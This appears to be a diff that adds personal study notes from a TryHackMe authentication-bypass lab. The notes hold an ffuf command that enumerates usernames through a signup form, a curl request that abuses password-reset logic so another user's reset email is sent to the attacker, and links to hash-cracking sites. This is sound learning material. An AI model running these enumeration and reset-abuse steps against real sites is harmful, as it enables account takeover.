@@ -1,0 +1,17 @@
+http://github.com/ffuf/ffuf
+
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" 
+-H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.33.252/customers/signup -mr "username already exists"
+#In this example, we used the create user screen to enumerate through already created usernames with -mr "username already exists"
+#We used a wordlist and in this example were able to find a few usernames for later use. ffuf must be looked into more. It has shown up in many tutorials
+
+Using "curl" 
+It is sometimes possible to skip steps in password reset logic statements on a website to allow for the changing of passwords.
+(curl 'http://10.10.33.252/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert')
+we can get the php logic statements returned for analysis.
+In the Tryhackme tutorial, the attacker creates a support email account. This account gets the password reset email instead of the intended email address.
+With the email sent to ourselves, we are able to reset the password and access the site.
+
+Hashes:
+https://crackstation.net
+https://www.base64decoding.org
